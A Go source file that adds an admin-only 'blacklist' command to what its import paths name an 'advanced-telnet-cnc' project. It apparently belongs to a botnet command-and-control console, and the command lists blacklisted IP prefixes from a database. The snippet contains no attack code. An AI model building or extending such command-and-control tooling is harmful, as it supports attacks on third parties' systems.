package admin

import (
	"advanced-telnet-cnc/packages/simpletable"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"fmt"
	"strings"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"blacklist"},
		Description: "Manages the IP blacklist.",
		Admin:       true,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			if len(args) == 0 {
				blacklist, err := database.Blacklist()
				if err != nil {
					return err
				}

				if len(blacklist) == 0 {
					return session.Println("The blacklist is currently empty.")
				}

				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "#"},
						{Align: simpletable.AlignCenter, Text: "IP/Prefix"},
					},
				}

				for i, ip := range blacklist {
					table.Body.Cells = append(table.Body.Cells, []*simpletable.Cell{
						{Text: fmt.Sprintf("%d", i+1)},
						{Text: ip},
					})
				}

				table.SetStyle(simpletable.StyleCompactLite)
				return session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
			}

			return command.ErrNotEnoughArguments
		},
	})
}
